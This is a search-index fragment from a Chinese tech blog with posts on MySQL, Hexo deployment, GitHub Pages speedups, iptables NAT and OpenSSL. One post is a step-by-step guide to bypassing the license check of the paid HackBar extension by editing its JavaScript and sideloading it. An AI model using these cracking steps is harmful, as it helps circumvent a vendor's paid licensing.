","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"区别 https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:0","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"concat_ws http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:1","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"group_concat http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:2","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"前言 相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。 但是HackBar是收费软件，在其 官网 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。 考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。 未破解前的hackbar是这样的，按钮没法用，显示一个红框 下面我将以Chrome浏览器为例，对HackBar插件进行破解。 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:1:0","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"破解插件 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:2:0","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"找到插件路径 首先我们需要在官网上找到插件的安装地址并进行安装 安装后插件会存放在我们电脑的本地 在chrome中打开 version 页面，可以在 个人资料路径 位置找到Chrome浏览器数据的存放位置 我们在文件管理器中打开这个路径，找到里面的Extension目录，这个目录里面就存放了我们的所有扩展插件 我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:2:1","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"分析授权验证 我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 theme\\js\\hackbar-panel.js 这个js文件中 // 授权验证失败 function disable_hackbar(message=null) { // 将hidden属性移除，就会显示输入证书的红框 $('#alert-license').removeClass('hidden'); // 如果有消息，就在证书那个红框显示出来 if(message){ $('#alert-license span').text(message); } // 标记证书无效 license_ok = false; } // 从chrome本地存储中获取都license内容 chrome.storage.local.get(['license'], function (result) { const license = result.license; // 如果证书内容存在 if (license) { //通过链接谷歌服务器检查网络情况 fetch(\"https://google.com\") .then(function (response) { // 从证书服务器检查证书 fetch(license_server + \"/\" + license) .then(function (response) { return response.json(); }) .then(function (data) { // 无效的证书会返回 // {\"pong\":false,\"message\":\"License is invalid\"} const pong = data.pong; if (pong === false) { // 证书无效，调用函数显示红框并使功能不可用 disable_hackbar(data.message); } }).catch(error =\u003e { // 授权服务器连接不上 disable_hackbar(); }); }) .then(function (data) { }).catch(error =\u003e { }); } else { // 证书不存在，直接禁用插件 disable_hackbar(); } }); ........ // 证书检查函数 function check_license(){ // 检查 license_ok 标记 if(!license_ok){ throw new Error('Please input valid license!'); } } ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:2:2","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"进行破解 通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点： license_ok 一开始是 true 证书检查失败的红框一开始是隐藏的 授权验证失败调用的是 disable_hackbar() 函数 只在一处地方会向 服务器 检查证书状况 其他地方都是通过 check_license() 也就是 license_ok 标记检查授权的 也就是说，一共有两个关键点： 证书检查失败的红框 功能的正常使用 针对证书检查失败的红框，只需要 disable_hackbar 函数不运行 或者 里面去除hidden标记的代码不运行，就不会显示红框了 针对功能的正常使用，有很多办法可以达到： 首先我们知道，这些功能都是在调用 check_license() 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉 我们还发现， check_license() 函数是通过 license_ok 标记检查授权的，所以我们可以在检查前将 license_ok 标记为 true，或者说将前面标记 license_ok = false 的代码注释掉 最后我们发现，红框一开始是不显示的，license_ok一开始是true的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、license_ok为false，所以那段代码直接删除了就ok了 我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:2:3","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"插件安装 近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行 所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装 在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件 左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了 通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用 当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布 这样所有人都可以安装了，当然推荐是 不公开 的发布模式 安装后，按F12，插件就可以正常使用了 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:3:0","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"总结 本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/hack-hackbar/:4:0","tags":["HackBar","CTF","coding"],"title":"HackBar破解","uri":"https://lgf.im/posts/security/web-security/hack-hackbar/"},{"categories":["coding"],"content":"前言 很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 hexo g 生成静态网页，然后 hexo d 将public目录推送到github、coding、gitee等平台。 但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。 ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:1:0","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"操作 ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:0","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"开启actions功能 在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 Set up a workflow yourself 按钮创建自己的工作流。 这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。 在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作 当然，也可以选择在 hexo 根目录下创建 .github/workflows 目录，并在里面编写github actions配置文件的方法来开启这个功能。 ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:1","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"基本部署 首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤 - uses:actions/checkout@masterwith:submodules:true 因为hexo需要依赖node.js环境，所以我们还要安装node环境 - uses:actions/setup-node@masterwith:node-version:12.x 有了node环境后我们需要安装各种依赖包 - name:Installationrun:| npm install npm install -g hexo-cli 依赖装好后就可以执行命令生成静态网站了 - name:Generaterun:hexo clean \u0026\u0026 hexo g 最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了 - name:Deployuses:peaceiris/actions-gh-pages@v3with:github_token:${{ secrets.GITHUB_TOKEN }}publish_dir:./publiccname:g.blog.lgf.im ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:2","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"增加更多功能 在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。 ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:3","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"完整配置文件 我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。 name:Hexo CICDon:push:branches:- masterjobs:deploy:name:hexo build \u0026 deployruns-on:ubuntu-18.04steps:- uses:actions/checkout@masterwith:submodules:true- uses:actions/setup-node@masterwith:node-version:12.x - name:replace cdn urlid:replacerun:| tagname=$(date +%y%j%H%M) sed -i \"s/hexoblog/hexoblog@$tagname/g\" _config.yml sed -i \"s/hexoblog/hexoblog@$tagname/g\" themes/cactus/_config.yml echo \"::set-output name=tagname::$tagname\" - name: Installation run: | npm install npm install -g hexo-cli gulp - name: Generate run: hexo clean \u0026\u0026 hexo g \u0026\u0026 gulp \u0026\u0026 hexo d - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public cname: g.blog.lgf.im - name: Create Release uses: actions/create-release@latest env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: tag_name: ${{ steps.replace.outputs.tagname }} release_name: ${{ steps.replace.outputs.tagname }} body: Automatic generated draft: false prerelease: true 在github actions将page专用分支更新后，zeit\\netlify\\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了 ","date":"2020-03-21","objectID":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/:3:0","tags":["Github","CICD","coding","hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/"},{"categories":["coding"],"content":"前言 相信不少小伙伴都在使用 Github Pages 提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用 Github Pages 搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和 CDN。 正巧我也在使用 Github Pages 搭建自己的静态博客，正好来说一下我的优化方法。 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:1:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"压缩 默认情况下，如果我们查看 Hexo 生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的 hexo 主题没有进行优化，大量的 css 和 js 文件也存在这样的垃圾内容。 如果你在一些大型网站右键查看网页源代码，你会发现他们的 html\\js\\css 是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。 所以我们优化速度的第一关就是对 Hexo 生成的代码进行压缩。 这里我使用的工具是 gulp ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:2:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"安装 gulp 在自己本机安装 npm install gulp -g 为了 Github Action 或其他 CI\\CD 平台也能够进行安装，这里推荐 npm install gulp --save-dev 我们还需要一些依赖 npm install --save-dev \\ gulp-minify-css \\ gulp-babel \\ gulp-uglify \\ gulp-htmlmin \\ gulp-htmlclean \\ gulp-imagemin \\ imagemin-jpegtran \\ imagemin-svgo \\ imagemin-gifsicle \\ imagemin-optipng ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:2:1","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"创建配置文件 在博客 hexo 的根目录下，新建 gulpfile.js 配置文件 var gulp = require(\"gulp\"); var minifycss = require(\"gulp-minify-css\"); var uglify = require(\"gulp-uglify\"); var htmlmin = require(\"gulp-htmlmin\"); var htmlclean = require(\"gulp-htmlclean\"); var imagemin = require(\"gulp-imagemin\"); // 压缩css文件 gulp.task(\"minify-css\", function () { return gulp .src(\"./public/**/*.css\") .pipe(minifycss()) .pipe(gulp.dest(\"./public\")); }); // 压缩html gulp.task(\"minify-html\", function () { return gulp .src(\"./public/**/*.html\") .pipe(htmlclean()) .pipe( htmlmin({ collapseWhitespace: true, collapseBooleanAttributes: true, removeComments: true, removeEmptyAttributes: true, removeScriptTypeAttributes: true, removeStyleLinkTypeAttributes: true, minifyJS: true, minifyCSS: true, minifyURLs: true, ignoreCustomFragments: [/\\{\\{[\\s\\S]*?\\}\\}/], }) ) .pipe(gulp.dest(\"./public\")); }); // 压缩js文件 gulp.task(\"minify-js\", function () { return gulp .src([\"./public/**/*.js\", \"!./public/js/**/*min.js\"]) .pipe(uglify()) .pipe(gulp.dest(\"./public\")); }); // 压缩图片 gulp.task(\"minify-images\", function () { return gulp .src([ \"./public/**/*.png\", \"./public/**/*.jpg\", \"./public/**/*.gif\", \"./public/**/*.svg\", ]) .pipe( imagemin([ imagemin.gifsicle({ interlaced: true }), imagemin.mozjpeg({ quality: 75, progressive: true }), imagemin.optipng({ optimizationLevel: 5 }), imagemin.svgo({ plugins: [{ removeViewBox: true }, { cleanupIDs: false }], }), ]) ) .pipe(gulp.dest(\"./public\")); }); gulp.task( \"default\", gulp.series( gulp.parallel(\"minify-html\", \"minify-css\", \"minify-js\", \"minify-images\") ) ); ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:2:2","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"使用方法 在使用 hexo g 生成静态网站后， 运行 gulp 进行压缩 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:2:3","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"使用 CDN 如果你查看博客的网络请求内容，你会发现在 html 加载之后，还有一堆小文件等待加载，而这些 css\\js\\图片文件的加载占据了大部分的网页打开时间。 因为 Github Pages 的延迟巨大，速度极慢，我们更有必要使用国内的 CDN 对这些资源进行分发。 不想使用国内付费的 CDN 服务，我尝试过使用 CloudFlare 进行加速（实质减速）效果不佳，后来发现了 jsDelivr。 jsDelivr 是一家开源免费 CDN，主要是对 npm 包进行 CDN 分发 绝妙的是它还能对 Github 和 Wordpress 进行 CDN 分发 我们可以借助 jsDelivr 的 Github 资源分发 服务来对我们博客中的 css\\js\\小图片进行加速 这是我目前找到的唯一一家在国内有节点并且不需要备案的 CDN 分发服务 这里我就以我使用的主题为例，分享一下我如何使用 jsDelivr 进行 CDN 分发 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:3:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"链接格式 jsDelivr 针对 Github 资源有众多 URL 格式 https://cdn.jsdelivr.net/gh/user/repo@version/file https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js https://cdn.jsdelivr.net/gh/jquery/jquery/ 考虑到 jsDelivr 默认缓存时间是 7 天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是 https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js https://cdn.jsdelivr.net/gh/ github用户名 / 库名 @ 版本号或者tag / 路径/文件名 我们可以通过打 tag 来访问同一个资源文件的不同版本，而不需要考虑缓存时间 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:3:1","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn:enabled:trueurl:https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c!-- styles --\u003e \u003c% if (theme.cdn.enabled) { %\u003e \u003clink rel=\"stylesheet\" href=\"\u003c%= theme.cdn.url %\u003e/css/style.css\"\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:3:2","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"加载时文字可见 无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感 我们必须使字体加载时文字可见，这样才能弥补 github pages 的慢 具体方法是将各 @font-face 中 font-display 设置为 swap, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体 每一个地方都需要改，自己搜索吧 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:4:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"使用 DisqusJS 由于众所周知的原因，disqus 被墙了，国内访问不了，而大部分 hexo 网站都使用 disqus 作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。 并且，即使有的用户翻墙能够访问 Disqus，但 Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。 在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改 参考链接： https://blog.skk.moe/post/disqusjs/ https://disqusjs.skk.moe/ https://github.com/SukkaW/DisqusJS 对于使用的 Disqus API 反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是 zeit 进行搭建，感觉还不错 如果 disqusJS 默认样式不适合自己的主题，推荐 fork 原库进行修改，注意要使用 1.2.6，最新的 master 在懒加载上有点问题 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:5:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"使用懒加载 如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:6:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"图片懒加载 对于图片，我使用了 hexo-lazyload-image 这个插件 安装 npm install hexo-lazyload-image --save 配置文件中添加 lazyload: enable: true onlypost: false loadingImg: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2/images/loading.png 顺便给懒加载添加了 cdn 功能，可以替换成 cdn 链接来加速 npm install hexo-lazyload-image-cdn --save 配置文件中添加 lazyload: enable: true onlypost: false loadingImg: # eg ./images/loading.gif cdn: enabled: false url: https://cdn.com ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:6:1","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"评论懒加载 对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。 所以我这里对 disqus 的加载使用懒加载技术，参考 https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/ 我使用的是 disqusJS, 下面给出加载的 js 代码 \u003c!-- DisqusJS Comments --\u003e \u003c% if (theme.disqusjs.enabled \u0026\u0026 theme.disqusjs.shortname){ %\u003e \u003cscript crossorigin defer src=\"https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js\" id=\"disqusjs-script\"\u003e\u003c/script\u003e \u003cscript\u003e document.getElementById(\"disqusjs-script\").addEventListener(\"load\",function() { setTimeout( function() { function t() { var dsqjs = new DisqusJS({ shortname: '\u003c%= theme.disqusjs.shortname %\u003e', siteName: '\u003c%= theme.disqusjs.siteName %\u003e', api: '\u003c%= theme.disqusjs.api %\u003e', apikey: '\u003c%= theme.disqusjs.apikey %\u003e', admin: '\u003c%= theme.disqusjs.admin %\u003e', adminLabel: '\u003c%= theme.disqusjs.adminLabel %\u003e' }); } var runningOnBrowser = typeof window !== \"undefined\"; var isBot = runningOnBrowser \u0026\u0026 !(\"onscroll\" in window) || typeof navigator !== \"undefined\" \u0026\u0026 /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent); var supportsIntersectionObserver = runningOnBrowser \u0026\u0026 \"IntersectionObserver\" in window; if (!isBot \u0026\u0026 supportsIntersectionObserver) { var disqus_observer = new IntersectionObserver(function(entries) { if (entries[0].isIntersecting) { t(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.getElementById('disqus_thread')); } else { t(); } }, 1); },!0 ); \u003c/script\u003e \u003c% } %\u003e ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:6:2","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"终极大招 如果经过上面的优化，你还对博客的加载速度不满意，那一定是 github pages 服务器在美国的原因，200+ms 的延迟导致首字节返回时间不短 其实支持通过 Github 仓库代码进行构建，部署为静态网站的平台不值 github pages 一家，我使用过的比较好的是 zeit.co ， 国内访问走的是台湾的 gcp 节点，延迟低速度快，推荐 具体使用方法非常简单，自行摸索吧 更新: 刚知道，如果更新太快的话，zeit 会暂停构建部署的 You are pushing commits at a very fast pace (across the whole organization). Due to that, we cannot deploy the commit e80751b. You can try again later or upgrade your plan. ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:7:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"辅助优化 使用谷歌提供的 Pagespeed Insights 工具分析网页加载并根据建议进行优化 ","date":"2020-03-19","objectID":"https://lgf.im/posts/coding/speedup-github-page/:8:0","tags":["github","jsdelivr","gulp","coding"],"title":"加快Github Pages国内访问速度","uri":"https://lgf.im/posts/coding/speedup-github-page/"},{"categories":["coding"],"content":"实验环境 使用 vmware 分别创建win7和ubuntu两个虚拟机 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:1:0","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"ubuntu 18.04 充当网关路由器 网卡1(WAN口)：桥接公网 网卡2(LAN口)：vmnet15 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:1:1","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"win7 充当内网客户机 网卡：vmnet15 vmnet15不使用vmware的配置，使用一个空的vmnet ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:1:2","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"ubuntu 配置 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:2:0","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"开启ipv4 forward 修改 /etc/sysctl.conf 开启ipv4的forward功能，将下面的注释打开，如果没有手动添加。 sysctl -p 生效 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:2:1","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"配置网卡信息 ip addr 查看所有网卡的名称和信息 ubuntu18.04使用netplan管理网络，修改其配置文件 sudo nano /etc/netplan/50-cloud-init.yaml 使用 netplan try 检查配置是否正确，如果正确自动应用生效 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:2:2","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"配置iptables规则 //清空已有规则防止干扰 iptables -F //进、出、转发默认允许 iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT //将从子网网段来的连接nat到eno33网卡(互联网)，ip改为外网ip iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eno33 -j SNAT --to-source 192.168.254.129 //添加伪装 iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:2:3","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"win7 设置 修改网卡配置如图 win7即可通过ubuntu这个网关上网 ","date":"2020-03-18","objectID":"https://lgf.im/posts/linux/ubuntu-iptables-nat/:3:0","tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://lgf.im/posts/linux/ubuntu-iptables-nat/"},{"categories":["coding"],"content":"简介 目标平台： Windows 10 amd64 使用静态链接方式，原因：动态链接库太大了，包含很多本次实验不需要的函数 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:1:0","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"准备工作 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:2:0","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"下载openssl代码 git clone https://github.com/openssl/openssl.git 或者从官网 https://www.openssl.org/source/ 下载源代码 我使用的是openssl 1.1.1 